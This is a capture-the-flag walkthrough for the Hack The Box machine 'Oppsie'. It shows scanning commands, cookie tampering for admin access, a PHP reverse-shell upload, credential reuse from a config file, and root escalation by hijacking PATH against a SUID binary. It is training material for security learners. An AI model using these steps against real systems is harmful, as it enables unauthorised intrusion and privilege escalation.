# HACKTHEBOX - Oppsie

## Enumeration:
```bash
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan'
rustscan -a $IP --greppable # [22,80]

sudo nmap -v -sV -sC -p 22,80 -o nmap.txt $IP # sudo for SYN Stealth Scan
```

**nmap results**:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Working with port 80:

Main page is a boring web template, nothing much to inspect. Let's brute-forcing web directory:
```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$IP/
# /server-status --> 403 Forbidden
# /uploads --> 403 Forbidden
```

**Boring exploit to gain admin access**:

Duh!! try using crawler from Burp-Suite to build Site-Map(listening all traffic to build a map), found: `/cdn-cgi/login/`

Login as guest --> uploads --> This action require super admin 

Login as guest --> account --> ?content=accounts&id=2 is [2233]guest--> ?content=accounts&id=1 is [34322]admin

Change cookies from user=2233 && role=guest to user=34322 && role=admin --> *ADMIN HERE!!*

Upload `php-reverse-shell.php` --> trigger by `/uploads/php-reverse-shell.php` --> *reverse shell here!!*

Oldy upgrade normal shell to interactive shell!!
```bash
which python3 # yes
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl + z
stty -raw echo; fg
export TERM=xterm-256color
stty rows 40 columns 173
export SHELL=bash
```

From `/var/www/html/cdn-cgi/login/db.php`:
```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```
Sweet, let's switch to `robert` account, `www-data` is lowest and boring privileges to messing around!!
```bash
su robert
# Password: M3g4C0rpUs3r!
```
From `/home/robert/user.txt`:

**user flag**: `HTB{f2c74ee8db7983851ab2a96a44eXXXXX}` 

**Find executable file bugtracker group**: `find / -group bugtracker -type f 2>/dev/null` --> `/usr/bin/bugtracker`

This also can be done by finding SUID file: `-perm u=s`

`/usr/bin/bugtracker` is SUID(set owner user id) by root(executed under privileges of root)
```bash
/usr/bin/bugtracker
# Enter bug ID: 1000 --> error --> cat: /root/reports/10000 --> the executable being called in an insecure manner(not being called full path)

# Ok, let's manipulate $PATH variable to gain root access!
cd /tmp
cat "/bin/bash" > cat # spawn bash shell in root privileges!
export PATH=/tmp:$PATH
/usr/bin/bugtracker # Enter bug ID: 0
whoami # root
```

From `/root/root.txt`:

**root flag**: `HTB{af13b0bee69f8a877c3faf667f7XXXXX}`
